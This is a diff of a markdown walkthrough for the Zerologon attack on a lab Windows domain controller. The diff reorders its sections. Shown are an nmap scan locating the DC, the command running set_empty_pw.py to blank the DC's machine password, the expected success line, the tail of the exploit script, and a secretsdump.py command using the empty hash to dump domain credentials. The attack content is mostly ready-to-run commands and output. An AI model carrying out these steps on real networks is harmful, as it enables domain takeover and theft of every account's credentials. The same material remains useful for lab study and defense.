@@ -11,7 +11,51 @@
 
 **That is all!!**
 
-## set_empty_pw.py
+
+## Nmap to the rescue:
+### Find the DC specifically:
+All domain controllers listen on port 389
+
+```
+sudo nmap -p389 -sV 192.168.1.28
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 22:25 PDT
+Nmap scan report for 192.168.1.28
+Host is up (0.00037s latency).
+
+PORT    STATE SERVICE VERSION
+389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
+MAC Address: 08:00:27:AA:C2:F6 (Oracle VirtualBox virtual NIC)
+Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
+```
+
+## In Our Example:
+1. Domain Name = ZEROLOGON
+2. NetBIOS Name = ZEROLOGON-DC
+3. IP address = 192.168.1.28
+
+## change directory to the zerologon exploit folder:
+
+```
+cd ~/zerologon
+```
+
+## 1st run set_empty_pw.py to exploit the machine:
+
+this will set the password to an empty string
+
+python3 set_empty_pw.py \<NetBIOS-name\> \<IP-Address\>
+```
+python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
+```
+looking for:
+
+Success! DC should now have the empty string as its machine password.
+
+
+### set_empty_pw.py
 [Contents:](https://raw.githubusercontent.com/risksense/zerologon/master/set_empty_pw.py)
 ```python3
 #!/usr/bin/env python3
@@ -162,49 +206,6 @@ if __name__ == '__main__':
     dc_name = dc_name.rstrip('$')
     perform_attack('\\\\' + dc_name, dc_ip, dc_name)
 ```
-
-## Nmap to the rescue:
-### Find the DC specifically:
-All domain controllers listen on port 389
-
-```
-sudo nmap -p389 -sV 192.168.1.28
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 22:25 PDT
-Nmap scan report for 192.168.1.28
-Host is up (0.00037s latency).
-
-PORT    STATE SERVICE VERSION
-389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
-MAC Address: 08:00:27:AA:C2:F6 (Oracle VirtualBox virtual NIC)
-Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
-```
-
-## In Our Example:
-1. Domain Name = ZEROLOGON
-2. NetBIOS Name = ZEROLOGON-DC
-3. IP address = 192.168.1.28
-
-## change directory to the zerologon exploit folder:
-
-```
-cd ~/zerologon
-```
-
-## 1st run set_empty_pw.py to exploit the machine:
-
-this will set the password to an empty string
-
-python3 set_empty_pw.py \<NetBIOS-name\> \<IP-Address\>
-```
-python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
-```
-looking for:
-
-Success! DC should now have the empty string as its machine password.
-
 
 ## 2nd run secretsdump.py to dump the hashes:
 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \<Domain\>/\<NETBIOS-name\>\\$@\<IP-Address\>
